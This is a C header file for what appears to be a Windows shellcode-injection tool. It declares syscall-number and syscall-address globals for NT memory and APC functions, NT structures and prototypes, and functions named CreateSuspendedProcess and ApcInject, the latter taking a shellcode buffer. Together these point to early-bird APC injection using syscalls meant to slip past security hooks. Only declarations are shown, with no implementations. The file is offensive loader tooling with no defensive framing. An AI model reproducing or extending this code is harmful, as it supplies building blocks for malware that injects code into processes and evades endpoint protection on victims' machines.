#pragma once

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#define OKAY(MSG, ...) printf("[+] "          MSG "\n", ##__VA_ARGS__)
#define INFO(MSG, ...) printf("[*] "          MSG "\n", ##__VA_ARGS__)
#define WARN(MSG, ...) fprintf(stderr, "[-] " MSG "\n", ##__VA_ARGS__)


typedef unsigned __int64 QWORD;

DWORD fn_NtAllocateVirtualMemorySSN;
DWORD fn_NtWriteVirtualMemorySSN;
DWORD fn_NtProtectVirtualMemorySSN;
DWORD fn_NtFreeVirtualMemorySSN;
DWORD fn_NtQueueApcThreadSSN;

QWORD fn_NtAllocateVirtualMemorySyscall;
QWORD fn_NtWriteVirtualMemorySyscall;
QWORD fn_NtProtectVirtualMemorySyscall;
QWORD fn_NtFreeVirtualMemorySyscall;
QWORD fn_NtQueueApcThreadSyscall;


typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
    PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p,n,a,r,s) { \
(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
(p)->RootDirectory = (r); \
(p)->Attributes = (a); \
(p)->ObjectName = (n); \
(p)->SecurityDescriptor = (s); \
(p)->SecurityQualityOfService = NULL; \
}

extern NTSTATUS(NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

extern NTSTATUS(NtWriteVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL
    );

extern NTSTATUS(NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewProtect,
    PULONG OldProtect
    );

extern NTSTATUS(NtFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

extern NTSTATUS(NtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
    );

typedef NTSTATUS(NTAPI* PFN_NtClose)(HANDLE Handle);

typedef VOID(NTAPI* PPS_APC_ROUTINE)(ULONG_PTR Parameter);

BOOL CreateSuspendedProcess
(
    IN LPCSTR ProcessName,
    OUT DWORD* PID,
    OUT HANDLE* hProcess,
    OUT HANDLE* hThread
);

BOOL ApcInject
(
    IN HANDLE hProcess,
    IN HANDLE hThread,
    IN BYTE* pShellcode,
    IN SIZE_T sShellSize
);